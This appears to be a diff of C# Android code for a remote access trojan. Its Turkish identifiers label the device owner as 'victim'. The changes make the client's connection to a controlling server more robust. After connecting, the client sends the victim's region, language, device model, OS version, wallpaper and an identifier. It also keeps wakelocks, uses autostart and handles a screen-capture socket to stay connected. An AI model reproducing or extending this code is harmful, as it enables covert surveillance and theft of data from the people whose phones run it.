@@ -110,7 +110,7 @@ namespace Task2
             {
                 Alarm.glob_alarm.wakelock.Release();
             }
-            await Task.Delay(100);
+            await Task.Delay(250);
             await Task.Run(() =>
             {
                 try
@@ -118,7 +118,8 @@ namespace Task2
                     ipadresi = Dns.GetHostAddresses(MainValues.IP)[0];
                     endpoint = new IPEndPoint(ipadresi, MainValues.port);
 
-                    if (Soketimiz != null) { try { Soketimiz.Dispose(); } catch (Exception) { } }
+                    if (Soketimiz != null) {
+                        try { Soketimiz.Close(); } catch (Exception) { } try { Soketimiz.Dispose(); } catch (Exception) { } }
 
                     Soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                     Soketimiz.ReceiveTimeout = -1; Soketimiz.SendTimeout = -1;
@@ -126,26 +127,40 @@ namespace Task2
                     Soketimiz.NoDelay = true;
                     SetKeepAlive(Soketimiz, 2000, 1000);
 
-                    Soketimiz.Connect(endpoint);
-                    if (Alarm.glob_alarm.wakelock.IsHeld)
+                    IAsyncResult result = Soketimiz.BeginConnect(ipadresi, MainValues.port, null, null);
+
+                    bool success = result.AsyncWaitHandle.WaitOne(5000, true);
+
+                    if (Soketimiz.Connected)
                     {
-                        Alarm.glob_alarm.wakelock.Release();
+                        Soketimiz.EndConnect(result);
+
+                        //Soketimiz.Connect(endpoint);
+                        if (Alarm.glob_alarm.wakelock.IsHeld)
+                        {
+                            Alarm.glob_alarm.wakelock.Release();
+                        }
+                        cancelAlarm(this);
+                        mySocketConnected = true;
+
+                        byte[] dataToSend = System.Text.Encoding.UTF8.GetBytes("[VERI]" +
+                        MainValues.KRBN_ISMI + "[VERI]" + RegionInfo.CurrentRegion + "/" + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName
+                        + "[VERI]" + DeviceInfo.Manufacturer + "/" + DeviceInfo.Model + "[VERI]" + DeviceInfo.Version + "/" + ((int)Build.VERSION.SdkInt).ToString() + "[VERI]" + wallpaper() + "[VERI]" + MainValues.KRBN_ISMI + "_" + GetIdentifier());
+
+                        dataToSend = MyDataPacker("MYIP", dataToSend);
+
+                        Soketimiz.Send(dataToSend, 0, dataToSend.Length, SocketFlags.None);
+
+                        new infoAl(Soketimiz, this);
                     }
-                    cancelAlarm(this);
-                    mySocketConnected = true;
-
-                    byte[] dataToSend = System.Text.Encoding.UTF8.GetBytes("[VERI]" +
-                    MainValues.KRBN_ISMI + "[VERI]" + RegionInfo.CurrentRegion + "/" + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName
-                    + "[VERI]" + DeviceInfo.Manufacturer + "/" + DeviceInfo.Model + "[VERI]" + DeviceInfo.Version + "/" + ((int)Build.VERSION.SdkInt).ToString() + "[VERI]" + wallpaper() + "[VERI]" + MainValues.KRBN_ISMI + "_" + GetIdentifier());
-
-                    dataToSend = MyDataPacker("MYIP", dataToSend);
-
-                    Soketimiz.Send(dataToSend, 0, dataToSend.Length, SocketFlags.None);
-
-                    new infoAl(Soketimiz, this);
+                    else
+                    {
+                        setAlarm(this);
+                    }
                 }
-                catch (Exception) {
-                    
+                catch (Exception)
+                {
+
                     setAlarm(this);
                 }
             });
@@ -225,18 +240,19 @@ namespace Task2
 
                     try { ImageAvailableListener.screenSock.Close(); } catch (Exception) { }
                     try { ImageAvailableListener.screenSock.Dispose(); } catch (Exception) { }
-                    
+
                     if (tmp_form.CLOSE_CONNECTION == false)
                     {
-                                               
+
                         tmp_form.setAlarm(global_activity);
                     }
-                    else {
+                    else
+                    {
                         tmp_form.cancelAlarm(global_activity);
-                       
+
                     }
-                    
-                        
+
+
                 }
             }
 
@@ -687,7 +703,7 @@ namespace Task2
                 Preferences.Set("pass", Resources.GetString(Resource.String.PASSWORD));
                 openAutostartSettings(this);
             }
- 
+
             MainValues.IP = Preferences.Get("aypi_adresi", "192.168.1.7");
             MainValues.port = int.Parse(Preferences.Get("port", "5656"));
             MainValues.KRBN_ISMI = Preferences.Get("kurban_adi", "n-a");
@@ -702,7 +718,7 @@ namespace Task2
             {
                 dozeMod();
             }
-           
+
             createDir();
 
             setAlarm(this);
